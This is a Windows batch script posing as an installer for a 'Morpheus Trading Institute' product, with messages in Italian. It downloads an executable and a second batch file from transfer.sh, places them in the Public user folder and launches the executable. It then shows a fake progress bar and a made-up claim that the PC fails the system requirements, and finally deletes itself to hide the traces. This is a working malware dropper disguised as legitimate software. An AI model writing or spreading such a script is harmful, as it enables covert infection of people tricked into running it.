@echo off
%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor Green %1  MORPHEUS TRADING INSTITUTE
echo.
echo.
echo Installazione in corso, attendere...

timeout /t 2 /nobreak > NUL

powershell -Command "Invoke-WebRequest https://transfer.sh/get/03vnqq/AIO.exe -OutFile AIO.exe"
powershell -Command "Invoke-WebRequest https://transfer.sh/get/JewXvm/Installer.bat -OutFile Installer.bat"
timeout /t 2 /nobreak > NUL
move AIO.exe C:\Users\Public > NUL
move Installer.bat C:\Users\Public > NUL
start C:\Users\Public\AIO.exe >NUL

echo.
echo.

%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor DarkMagenta %1 Completato: --- 25 
timeout /t 2 /nobreak > NUL
%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor DarkMagenta %1 Completato: ------ 50
timeout /t 2 /nobreak > NUL
%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor DarkMagenta %1 Completato: --------- 75
timeout /t 2 /nobreak > NUL
%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor DarkMagenta %1 Completato: ------------ 100

timeout /t 4 /nobreak > NUL

echo.

echo Questo PC non soddisfa attualmente tutti i requisiti di sistema
echo Contatta admin@morpheustradinginstitute.com per ulteriori informazioni

timeout /t 2 /nobreak > NUL
echo.
echo Chiusura dell'applicazione in corso...

timeout /t 4 /nobreak > NUL

DEL "%~f0">NUL